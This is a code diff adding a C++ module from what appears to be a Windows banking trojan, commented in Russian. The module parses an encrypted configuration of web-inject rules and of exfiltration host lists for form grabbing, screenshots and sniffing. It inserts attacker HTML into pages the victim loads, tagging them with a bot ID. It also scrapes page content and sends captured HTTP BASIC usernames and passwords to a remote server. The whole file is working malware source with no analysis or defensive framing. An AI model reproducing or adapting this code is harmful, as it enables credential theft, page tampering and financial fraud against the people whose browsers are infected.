@@ -1,0 +1,894 @@
+#include <windows.h>
+
+#include "BotConfig.h"
+#include "GetApi.h"
+#include "Strings.h"
+#include "Memory.h"
+#include "Utils.h"
+#include "Config.h"
+#include "BotUtils.h"
+#include "Loader.h"
+
+
+
+bool bHttp;
+bool bHttps;
+
+THTMLInjectEvent InjectEvent; // Обработчик события HTML инжекта
+
+
+void SetHTMLInjectEvent(THTMLInjectEvent Event)
+{
+	// функция устанавливает обработчик события для инжекта HTML
+    InjectEvent = Event;
+}
+
+void CallHTMLInjectEvent(PINJECTDATA Inject, bool Injected, DWORD DataNomber)
+{
+	// Вызываем событие инжекта
+	if (InjectEvent)
+	{
+    	InjectEvent(Inject, Injected, DataNomber);
+	}
+}
+
+void GetCurrentConfigHostSetings(bool * http, bool * https)
+{
+	*http	=	bHttp;
+	*https	=	bHttps;
+}
+
+char*FgrHostFromCfg=NULL;//1
+char*GraHostFromCfg=NULL;//2
+char*ScrHostFromCfg=NULL;//3
+char*SniHostFromCfg=NULL;//4
+char*PluginsHostFromCfg=NULL;//5
+DWORD TimeOut=70;
+
+char* GetCurrentHostFromConfig(int Num)
+{
+	char * Res;
+	if (Num==1)Res=FgrHostFromCfg;
+	if (Num==2)Res=GraHostFromCfg;
+	if (Num==3)Res=ScrHostFromCfg;
+	if (Num==4)Res=SniHostFromCfg;
+	if (Res==NULL)return NULL;
+	char* Domain;
+	char *cUrl;
+	int i;
+
+
+
+	while(true)
+	{
+		cUrl= m_strstr(Res,"|");
+		if (cUrl==NULL)
+		{
+			Domain=NULL;
+			break;
+		}
+		i=m_lstrlen(Res)-m_lstrlen(cUrl);
+		Domain=(char*)MemAlloc(i+1);
+		m_memcpy(Domain,Res,i);
+		if (!CheckHost(Domain))
+		{
+			Res+=i+1;
+			MemFree(Domain);
+		}
+		else 
+			break;
+	}
+
+
+return Domain;
+}
+
+DWORD GetConfigTimeOut()
+{
+	return TimeOut;
+}
+
+PCONFIG pConfig;
+
+PCONFIG GetConfig()
+{
+	return pConfig;
+}
+//----------------------------------------------------------------------------
+
+
+PCONFIG LoadConfig()
+{
+	WCHAR *ConfigFile = GetCfgPath();
+
+	PCONFIG Config = LoadConfigFromFile(ConfigFile);
+
+	return Config;
+}
+//----------------------------------------------------------------------------
+
+PCONFIG LoadConfigFromFile(WCHAR *FileName)
+{
+	//Загрухить конфигурационный файл
+
+	if ( FileName != NULL )
+	{
+		if ( (DWORD)pGetFileAttributesW( FileName ) == INVALID_FILE_ATTRIBUTES )
+		{
+			return NULL;
+		}
+	}
+	else
+	{
+		return NULL;
+	}
+
+	HANDLE hFile = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
+
+	if ( hFile == INVALID_HANDLE_VALUE )
+	{
+		return NULL;
+	}
+
+	DWORD h = 0;
+	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );
+
+	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );
+
+	if ( hMapFile == INVALID_HANDLE_VALUE )
+	{
+		return NULL;
+	}
+
+	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );
+
+	char Signature[] = {'B','J','B',0};
+
+	if ( m_memcmp( pbyFile, Signature, m_lstrlen( Signature ) ) )
+	{
+		pUnmapViewOfFile( pbyFile );
+		pCloseHandle( hMapFile );
+		pCloseHandle( hFile );
+
+		pDeleteFileW(FileName);
+
+		return NULL;
+	}
+
+	LPBYTE pbF = (LPBYTE)MemAlloc( ( dwFileSize - 3 ) + 1 );
+	m_memcpy( pbF, pbyFile + 3, dwFileSize - 3 );
+
+	pUnmapViewOfFile( pbyFile );
+	pCloseHandle( hMapFile );
+	pCloseHandle( hFile );
+
+	dwFileSize -= 3;
+
+
+	DWORD KeyLen = *(DWORD*)pbF;
+	pbF += sizeof( DWORD );
+
+	char *Key = (char*)MemAlloc( KeyLen + 1);
+	m_memcpy( Key, pbF, KeyLen );
+
+	pbF += KeyLen;
+
+	dwFileSize -= sizeof( DWORD );
+	dwFileSize -= KeyLen;
+
+	DWORD c = Crypt( Key, pbF, dwFileSize );
+
+	if ( c != dwFileSize )
+	{
+		return FALSE;
+	}
+
+	PCONFIG pCfg = (PCONFIG)MemAllocAndClear(sizeof(CONFIG));
+	if (pCfg == NULL)
+		return NULL;
+
+	LPBYTE p = pbF;
+
+
+	pCfg->bInjects_Exist = *(bool*)p;
+	p += sizeof( bool );
+
+	if ( !pCfg->bInjects_Exist )
+	{
+		return NULL;
+	}
+
+	//------------- Создаём массив данных для и нжекта в HTML -------------//
+
+	if ( ( pCfg->pInjects = (PINJECTS)MemAlloc(sizeof(INJECTS))) == NULL )
+		return NULL;
+
+	pCfg->pInjects->dwInjectsCount = *(DWORD*)p;
+	p += sizeof(DWORD );
+
+	if ((pCfg->pInjects->Injects = (PINJECTDATA)MemAlloc(sizeof(INJECTDATA)*pCfg->pInjects->dwInjectsCount)) == NULL)
+		return NULL;
+
+
+	//------------- Загружаем информацию о хостах -------------//
+
+	/*
+	fgr domain.com|domain2.com|domain3.com|
+	gra domain.com|domain2.com|domain3.com|
+	scr domain.com|domain2.com|domain3.com|
+	sni domain.com|domain2.com|domain3.com|
+	*/
+
+	DWORD dwFgrLen = *(DWORD*)p;
+	p += sizeof( DWORD );
+	if ( ( FgrHostFromCfg = (char*)MemAlloc(dwFgrLen + 1 ) ) == NULL )
+	{
+		return NULL;
+	}
+	m_memcpy( FgrHostFromCfg, p, dwFgrLen );
+	p += dwFgrLen;
+
+
+	DWORD dwGraLen = *(DWORD*)p;
+	p += sizeof( DWORD );
+	if ( ( GraHostFromCfg = (char*)MemAlloc(dwGraLen + 1 ) ) == NULL )
+	{
+		return NULL;
+	}
+	m_memcpy( GraHostFromCfg, p, dwGraLen );
+	p += dwGraLen;
+
+	DWORD dwScrLen = *(DWORD*)p;
+	p += sizeof( DWORD );
+	if ( ( ScrHostFromCfg = (char*)MemAlloc(dwScrLen + 1 ) ) == NULL )
+	{
+		return NULL;
+	}
+	m_memcpy( ScrHostFromCfg, p, dwScrLen );
+	p += dwScrLen;
+
+
+
+	DWORD dwSniLen = *(DWORD*)p;
+	p += sizeof( DWORD );
+	if ( ( SniHostFromCfg = (char*)MemAlloc(dwSniLen + 1 ) ) == NULL )
+	{
+		return NULL;
+	}
+	m_memcpy( SniHostFromCfg, p, dwSniLen );
+	p += dwSniLen;
+
+
+
+	DWORD dwPluginsLen = *(DWORD*)p;
+	p += sizeof( DWORD );
+	if ( ( PluginsHostFromCfg = (char*)MemAlloc(dwSniLen + 1 ) ) == NULL )
+	{
+		return NULL;
+	}
+	m_memcpy( PluginsHostFromCfg, p, dwPluginsLen );
+	p += dwPluginsLen;
+
+
+    //------------- Период обновления конфига -------------//
+	TimeOut = *(DWORD*)p;
+	p += sizeof( DWORD );
+
+
+	//------------- Настройки продоколов -------------//
+
+//	char*Path=GetCurrentHostFromConfig(1);
+
+	//---------------------------------------------------
+	if (p[0]=='0')
+	{
+	//	OutputDebugString("config loaded http false");
+		bHttp=false;
+	}
+	else
+	{
+	//	OutputDebugString("config loaded http true");
+		bHttp=true;
+	}
+	p += 1;
+
+	if (p[0]=='0')
+		bHttp = false;
+	else
+		bHttp = true;
+	p += 1;
+
+
+	//------------- Загружаем данные инжектов -------------//
+
+
+	for ( DWORD i = 0; i < pCfg->pInjects->dwInjectsCount; i++ )
+	{
+		pCfg->pInjects->Injects[i].dwUrlLen = *(DWORD*)p;
+		p += sizeof( DWORD );
+
+		if ( ( pCfg->pInjects->Injects[i].Url = (char*)MemAlloc( pCfg->pInjects->Injects[i].dwUrlLen + 1 ) ) == NULL )
+		{
+			return NULL;
+		}
+
+		m_memcpy( pCfg->pInjects->Injects[i].Url, p, pCfg->pInjects->Injects[i].dwUrlLen );
+		p += pCfg->pInjects->Injects[i].dwUrlLen;
+
+		pCfg->pInjects->Injects[i].dwMode = *(DWORD*)p;
+		p += sizeof( DWORD );
+
+		pCfg->pInjects->Injects[i].dwCount = *(DWORD*)p;
+		p += sizeof( DWORD );
+
+		//------------- Загружаем инжекты для сайта -------------//
+		DWORD DataLen = sizeof(DATATAG) * pCfg->pInjects->Injects[i].dwCount;
+
+
+		pCfg->pInjects->Injects[i].data_before = (PDATATAG)MemAlloc(DataLen);
+		pCfg->pInjects->Injects[i].data_inject = (PDATATAG)MemAlloc(DataLen);
+		pCfg->pInjects->Injects[i].data_after = (PDATATAG)MemAlloc(DataLen);
+
+		if (pCfg->pInjects->Injects[i].data_before == NULL ||
+			pCfg->pInjects->Injects[i].data_inject == NULL ||
+			pCfg->pInjects->Injects[i].data_after == NULL)
+		{
+        	return NULL;
+		}
+
+
+		for ( DWORD z = 0; z < pCfg->pInjects->Injects[i].dwCount; z++ )
+		{
+			pCfg->pInjects->Injects[i].data_before[z].dwDataLen = *(DWORD*)p;
+			p += sizeof( DWORD );
+
+			if ( ( pCfg->pInjects->Injects[i].data_before[z].Data = (char*)MemAlloc( pCfg->pInjects->Injects[i].data_before[z].dwDataLen + 1 ) ) == NULL )
+			{
+				return NULL;
+			}
+
+			m_memcpy( pCfg->pInjects->Injects[i].data_before[z].Data, p, pCfg->pInjects->Injects[i].data_before[z].dwDataLen );
+			p += pCfg->pInjects->Injects[i].data_before[z].dwDataLen;
+
+			//-----------------------------------
+
+			pCfg->pInjects->Injects[i].data_inject[z].dwDataLen = *(DWORD*)p;
+			p += sizeof( DWORD );
+
+			if ( ( pCfg->pInjects->Injects[i].data_inject[z].Data = (char*)MemAlloc( pCfg->pInjects->Injects[i].data_inject[z].dwDataLen + 1 ) ) == NULL )
+			{
+				return NULL;
+			}
+
+			m_memcpy( pCfg->pInjects->Injects[i].data_inject[z].Data, p, pCfg->pInjects->Injects[i].data_inject[z].dwDataLen );
+
+			p += pCfg->pInjects->Injects[i].data_inject[z].dwDataLen;
+
+			//------------------------------------
+
+			pCfg->pInjects->Injects[i].data_after[z].dwDataLen = *(DWORD*)p;
+			p += sizeof( DWORD );
+
+			if ( ( pCfg->pInjects->Injects[i].data_after[z].Data = (char*)MemAlloc( pCfg->pInjects->Injects[i].data_after[z].dwDataLen + 1 ) ) == NULL )
+			{
+				return NULL;
+			}
+
+			m_memcpy( pCfg->pInjects->Injects[i].data_after[z].Data, p, pCfg->pInjects->Injects[i].data_after[z].dwDataLen );
+
+			p += pCfg->pInjects->Injects[i].data_after[z].dwDataLen;
+		}
+	}
+
+	return pCfg;
+}
+//----------------------------------------------------------------------------
+
+
+void InitializeConfig()
+{
+	pConfig = LoadConfig();
+	return;
+}
+//----------------------------------------------------------------------------
+
+
+void InitializeConfigFromFile(WCHAR *FileName)
+{
+    pConfig = LoadConfigFromFile(FileName);
+}
+
+DWORD GetVerbNum( char *Verb )
+{
+	if ( Verb[0] == 'G' )
+	{
+		return VERB_IS_GET;
+	}
+	else if ( Verb[0] == 'P' )
+	{
+		return VERB_IS_POST;
+	}
+
+	return -1;
+}
+//----------------------------------------------------------------------------
+
+
+bool GetInjectFromConfig( char *Url, char *Verb, PINJECTDATA *pInjects, LPDWORD dwInjCount )
+{
+	// Функция возвращает необходимые данные для подмены в HTML документе
+	// для определения необходимых данных сравнивается адрес страницы с
+	// маской инжекта
+
+	if ( pConfig == NULL )
+		return false;
+
+
+	PINJECTDATA pInject = NULL;
+	DWORD i = 0;
+	DWORD dwCount = 0;
+	PCHAR Tmp;
+	DWORD Len;
+
+
+	for ( ; i < pConfig->pInjects->dwInjectsCount; i++ )
+	{
+		if ( CompareUrl( pConfig->pInjects->Injects[i].Url, Url ) )
+		{
+			DWORD dwVerb = GetVerbNum( Verb );
+
+			if ( dwVerb == (DWORD)-1 )
+				return false;
+
+			DWORD dwMode = pConfig->pInjects->Injects[i].dwMode;
+
+			if ( dwMode == MODE_SETTEXT_ALL  ||
+				 dwMode == MODE_GETTEXT_ALL  ||
+			   ((dwMode == MODE_SETTEXT_GET  || dwMode == MODE_GETTEXT_GET) && dwVerb == VERB_IS_GET ) ||
+			   ((dwMode == MODE_SETTEXT_POST || dwMode == MODE_GETTEXT_POST) && dwVerb == VERB_IS_POST))
+			{
+				if ( pInject == NULL )
+				{
+					if ( ( pInject = (PINJECTDATA)MemAlloc(sizeof(INJECTDATA))) == NULL )
+						return false;
+				}
+				else
+				{
+					PINJECTDATA p = (PINJECTDATA)MemRealloc(pInject, sizeof( pInject ) + ( sizeof(INJECTDATA ) * ( dwCount + 1 ) ) );
+					pInject		  = p;
+
+					if ( pInject == NULL )
+					{
+						return false;
+					}
+				}
+				
+
+				pInject[ dwCount ].dwMode  = pConfig->pInjects->Injects[i].dwMode;
+				pInject[ dwCount ].dwCount = pConfig->pInjects->Injects[i].dwCount;
+
+
+				// Создаём массив данных
+				DWORD ArraySize = sizeof(DATATAG) * pConfig->pInjects->Injects[i].dwCount;
+				
+				pInject[dwCount].data_before = (PDATATAG)MemAlloc(ArraySize);
+				pInject[dwCount].data_inject = (PDATATAG)MemAlloc(ArraySize);
+				pInject[dwCount].data_after = (PDATATAG)MemAlloc(ArraySize);
+
+				if (pInject[dwCount].data_before == NULL ||
+					pInject[dwCount].data_inject == NULL ||
+					pInject[dwCount].data_after == NULL)
+					return false;
+
+				// Обнуляем массивы
+				m_memset(pInject[dwCount].data_before, 0, ArraySize);
+				m_memset(pInject[dwCount].data_inject, 0, ArraySize);
+				m_memset(pInject[dwCount].data_after, 0, ArraySize);
+
+
+				// Копируем данные
+				for ( DWORD a = 0; a < pConfig->pInjects->Injects[i].dwCount; a++ )
+				{
+					Len = pConfig->pInjects->Injects[i].data_before[a].dwDataLen;
+					if (Len > 0)
+					{
+						Tmp = (PCHAR)MemAlloc(Len + 1);
+						if (Tmp == NULL ) return false;
+						m_memcpy(Tmp, pConfig->pInjects->Injects[i].data_before[a].Data, Len);
+						*(Tmp + Len) = 0;
+						pInject[ dwCount ].data_before[a].Data = Tmp;
+                    }
+
+					pInject[ dwCount ].data_before[a].dwDataLen = pConfig->pInjects->Injects[i].data_before[a].dwDataLen;
+
+					//-------------------------------------------
+
+					Len = pConfig->pInjects->Injects[i].data_inject[a].dwDataLen;
+					if (Len > 0)
+					{
+						Tmp = (PCHAR)MemAlloc(Len + 1);
+						if (Tmp == NULL ) return false;
+						m_memcpy(Tmp, pConfig->pInjects->Injects[i].data_inject[a].Data, Len);
+						*(Tmp + Len) = 0;
+						pInject[ dwCount ].data_inject[a].Data = Tmp;
+					}
+
+					pInject[ dwCount ].data_inject[a].dwDataLen = pConfig->pInjects->Injects[i].data_inject[a].dwDataLen;
+
+					//-------------------------------------------
+
+					Len = pConfig->pInjects->Injects[i].data_after[a].dwDataLen;
+					if (Len > 0)
+					{
+						Tmp = (PCHAR)MemAlloc(Len + 1);
+						if (Tmp == NULL ) return false;
+						m_memcpy(Tmp, pConfig->pInjects->Injects[i].data_after[a].Data, Len);
+						*(Tmp + Len) = 0;
+						pInject[ dwCount ].data_after[a].Data = Tmp;
+					}
+
+					pInject[ dwCount ].data_after[a].dwDataLen = pConfig->pInjects->Injects[i].data_after[a].dwDataLen;
+				}
+
+				dwCount++;
+			}			
+		}
+	}
+
+	if ( dwCount != 0 )
+	{
+		*pInjects	= pInject;
+		*dwInjCount = dwCount;
+
+		return true;
+	}
+
+	return false;
+}
+//----------------------------------------------------------------------------
+
+bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject, PCHAR After)
+{
+	// Функция вставляет текст Inject между текстом Before и After
+    DWORD InjectLen = StrCalcLength(Inject);
+
+	if (Buffer == NULL || InjectLen == 0 || Before == NULL)
+		return false;
+
+    // Позиция блока Иуащку
+	DWORD BStart = 0;
+	DWORD BEnd = 0;
+	DWORD BLen = 0;
+    // Позиция блока After
+	DWORD AStart = 0;
+	DWORD AEnd = 0;
+	DWORD ALen = 0;
+
+	PCHAR AfterPtr = NULL;
+
+	// Ищем блок Before
+	if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
+		return false;
+
+
+
+	// Ищем блок After
+	if (StrCalcLength(After) != 0)
+	{
+		PCHAR BeforePtr = Buffer + BEnd;
+		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
+			return false;
+        AfterPtr = BeforePtr + AStart;
+	}
+	else
+    	AfterPtr = Buffer + BEnd; // Ставим указатель на конец блока Before
+
+
+	DWORD AfterLen = StrCalcLength(AfterPtr);
+
+	// Создаём новый буфер
+	DWORD NewBufLen = BEnd + InjectLen + AfterLen;
+	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
+	if (Buf == NULL) return false;
+
+	NewBuffer = Buf;
+
+	// Копируем строки
+	m_memcpy(Buf, Buffer, BEnd);
+	Buf += BEnd;
+	m_memcpy(Buf, Inject, InjectLen);
+	Buf += InjectLen;
+	m_memcpy(Buf, AfterPtr, AfterLen);
+	Buf += AfterLen;
+    *Buf = 0;
+
+    return true;
+}
+
+
+//----------------------------------------------------------------------------
+PCHAR GetText(PCHAR &Buffer, PCHAR Before, PCHAR After )
+{
+    // метод возвращает кусок HTML кода между блоками Before и After
+	if (StrIsEmpty(Before) || StrIsEmpty(After))
+		return NULL;
+
+	DWORD Start = 0;
+	DWORD End   = 0;
+	DWORD Len   = 0;
+
+	if (WildCmp(Buffer, Before, &Start, &End, &Len ))
+	{
+		PCHAR StartPtr = Buffer + End;
+		if (WildCmp(StartPtr, After, &Start, &End, &Len ) )
+		{
+			PCHAR EndPtr = StartPtr + Start;
+			// Смещаем указатель буфера на позицию за найденным текстом
+			Buffer = EndPtr;
+
+			DWORD Size = EndPtr - StartPtr;
+			if (Size > 0)
+				return StrNew(StartPtr, Size);
+		}
+	}
+	return NULL;
+}
+//----------------------------------------------------------------------------
+
+PCHAR GetHTMLLogCode(PCHAR Buffer, PINJECTDATA Inject)
+{
+	// Функция возвращает HTML код согласно настроек инжекта
+	if (StrIsEmpty(Buffer) || Inject == NULL)
+		return NULL;
+
+	PStrings S = StringsCreate();
+	bool Added = false;
+	PCHAR Code;
+
+	for (DWORD i = 0; i < Inject->dwCount; i++)
+	{
+		Code = GetText(Buffer, Inject->data_before[i].Data, Inject->data_after[i].Data);
+		if (Code != NULL)
+		{
+			Added = true;
+			StringsAdd(S, Code, false);
+        }
+    }
+	PCHAR Result = NULL;
+
+	if (Added)
+		Result = StringsGetText(S, " ");
+
+	StringsFree(S);
+    return Result;
+}
+
+//----------------------------------------------------------------------------
+
+bool SendHTMLLogToServer(PCHAR Buffer, PINJECTDATA Inject, PHTTPSessionInfo Session)
+{
+	// Функция отправляет блоки HTML на указанный в настройках сервер
+	if (!IsLogHTMLMode(Inject))
+		return false;
+	
+
+	// Получаем необходимые данные
+	PCHAR SendBuffer = NULL;
+
+    bool BufIsStr = false; /* временный влаг указывающий, что отправляемый буфер создавался как строка */
+
+
+	PCHAR Data = GetHTMLLogCode(Buffer, Inject);
+
+	if (Data == NULL)
+		return false;
+
+
+	DWORD BrowserType = 0;
+	PCHAR UserAgent = NULL;
+	PCHAR URL = NULL;
+
+	if (Session != NULL)
+	{
+		BrowserType = Session->BrowserType;
+		UserAgent = Session->UserAgent;
+
+		// Дополняем данные информацией о загружаемом адресе
+		if (Session->URL)
+		{
+			URL = Session->URL;
+			BufIsStr = true;
+			StrConcat(SendBuffer, 3, Session->URL, "|", Data);
+			StrFree(Data);
+        }
+
+	}
+
+	if (SendBuffer == NULL)
+		SendBuffer = Data;
+
+	//  Отправляем  полученные данные
+	SendFormGrabberLogs(URL, SendBuffer, UserAgent, BrowserType, DATA_TYPE_INJECT);
+
+	StrFree(SendBuffer);
+
+	return true;
+}
+//----------------------------------------------------------------------------
+
+bool HandleHTML(PCHAR Buffer, PCHAR &NewBuffer, PINJECTDATA Inject, PHTTPSessionInfo Session)
+{
+	/* метод вызывает обработчики загруженного HTML кода */
+    NewBuffer = NULL;
+	// при необходимости логируем HTML
+	if (IsLogHTMLMode(Inject))
+		return SendHTMLLogToServer(Buffer, Inject, Session);
+
+	// При необходимости вставляем свой код в загруженный
+	if (IsInjectHTMLMode(Inject))
+		return HtmlInject(Buffer, NewBuffer, Inject);
+
+	return false;
+}
+//----------------------------------------------------------------------------
+
+bool HtmlInject(PCHAR Buffer, PCHAR &nBuffer, PINJECTDATA pInject)
+{
+	// Метод обрабатывает загруженный HTML документ
+    nBuffer = NULL;
+
+	if (!IsInjectHTMLMode(pInject))
+		return false;
+
+	PCHAR NewBuffer = NULL;
+    PCHAR WorkBuf = Buffer;
+			
+	DWORD dwJumpSize = 0;
+	int dwRet		 = 0;
+	DWORD i			 = 0;
+
+	bool Injected = false; // Признак того, что был произведён хотя-бы один инжект
+
+
+	for ( i = 0; i < pInject->dwCount; i++ )
+	{
+		// Обработанные данные игнорируем
+		if (pInject->data_before[i].Handled) continue;
+
+		//  Подменяем идентификатор бота
+		if ( pInject->data_inject[i].Data != NULL && pInject->data_inject[i].dwDataLen )
+		{
+			DWORD dwStart = 0;
+			DWORD dwEnd   = 0;
+			DWORD dwLen	  = 0;
+
+			char UserID[] = {'%','u','s','e','r','_','i','d','%',0};
+			char Uid[100];
+
+			m_memset( Uid, 0, 100 );
+
+			DWORD dwJump = 0;
+
+			// блок подмены тега %user_id% на идентифиактор бота
+			// В данный момент ещё не разбирал "ОРИГИНАЛЬНОСТЬ"
+			// автора, оставим всё, как есть
+			while ( WildCmp( pInject->data_inject[i].Data + dwJump, UserID, &dwStart, &dwEnd, &dwLen ) )
+			{
+				if ( !m_lstrlen( Uid ) )
+				{
+					GenerateUid( Uid );
+				}
+
+				dwStart += dwJump;
+				dwEnd	+= dwJump;
+
+				char *DataInject = (char*)MemAlloc( dwStart + m_lstrlen( Uid ) + m_lstrlen( pInject->data_inject[i].Data + dwEnd ) + 1 );
+
+				m_memcpy( DataInject, pInject->data_inject[i].Data, dwStart );
+				m_memcpy( DataInject + m_lstrlen( DataInject ), Uid, m_lstrlen( Uid ) );
+				m_memcpy( DataInject + m_lstrlen( DataInject ), pInject->data_inject[i].Data + dwEnd, m_lstrlen( pInject->data_inject[i].Data + dwEnd ) );
+
+				MemFree( pInject->data_inject[i].Data );
+						
+				dwJump = dwStart + m_lstrlen( Uid );
+
+				pInject->data_inject[i].Data	  = DataInject;
+				pInject->data_inject[i].dwDataLen = m_lstrlen( pInject->data_inject[i].Data );
+
+			}
+		}
+
+		//  Инжектим HTML код в документ
+		if (SubstitudeText2(WorkBuf, NewBuffer, pInject->data_before[i].Data, pInject->data_inject[i].Data, pInject->data_after[i].Data))
+		{
+			// Инжект сработал, обрабатываем данные
+			Injected = true;
+			if (nBuffer != NULL)
+				MemFree(nBuffer);
+			nBuffer = NewBuffer;
+            WorkBuf = NewBuffer;
+			NewBuffer = NULL;
+
+			pInject->data_before[i].Handled = true;
+
+			// Вызываем событие
+			CallHTMLInjectEvent(pInject, true, i);
+		}
+		else
+			CallHTMLInjectEvent(pInject, false, i);
+	}
+
+	if (NewBuffer != NULL)
+		MemFree(NewBuffer);
+    return Injected;
+
+}
+//----------------------------------------------------------------------------
+
+void SendBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password)
+{
+	// Функция отправляет на сервер данные BASIC авторизации
+	PCHAR SendBuf = StrNew(8, Session->URL, "|", "POST:", "username=", UserName, "&", "password=", Password);
+
+	SendFormGrabberLogs(Session->URL,SendBuf, Session->UserAgent, Session->BrowserType, DATA_TYPE_FORMGRAB);
+
+	StrFree(SendBuf);
+}
+//----------------------------------------------------------------------------
+
+
+bool IsLogHTMLMode(PINJECTDATA Inject)
+{
+	// Функция возвращает истину если в инжекте включен режим отправки
+	// блоков HTML кода на удалённый сервер
+
+	if (Inject == NULL)
+		return false;
+
+	if ( Inject->dwMode == MODE_GETTEXT_GET  ||
+		 Inject->dwMode == MODE_GETTEXT_POST ||
+		 Inject->dwMode == MODE_GETTEXT_ALL )
+		return true;
+	else
+		return false;
+
+}
+//----------------------------------------------------------------------------
+
+bool IsInjectHTMLMode(PINJECTDATA Inject)
+{
+	// Функция возвращает истину если в инжекте включен режим вставки
+	// блоков HTML кода в загруженные данные
+
+	if (Inject == NULL)
+		return false;
+
+	if ( Inject->dwMode == MODE_SETTEXT_GET  ||
+		 Inject->dwMode == MODE_SETTEXT_POST ||
+		 Inject->dwMode == MODE_SETTEXT_ALL)
+		return true;
+	else
+		return false;
+
+}
+//----------------------------------------------------------------------------
+
+bool SupportContentType(PCHAR CType)
+{
+	// Функция возвращает истину если указанный тип контента
+	// поддерживается методами инжекта HTML
+	if (CType == NULL)
+		return false;
+	PCHAR Temp;
+	if (StrScan(CType, ';') != NULL)
+		Temp = GetLeftStr(CType, ";");
+	else
+		Temp = StrNew(CType);
+
+ 	int Result = StrIndexOf(Temp, false, 4, "text/html", "text/css", "text/plain",
+									 "application/x-javascript");
+
+	StrFree(Temp);
+    return Result >= 0;
+}
+//----------------------------------------------------------------------------
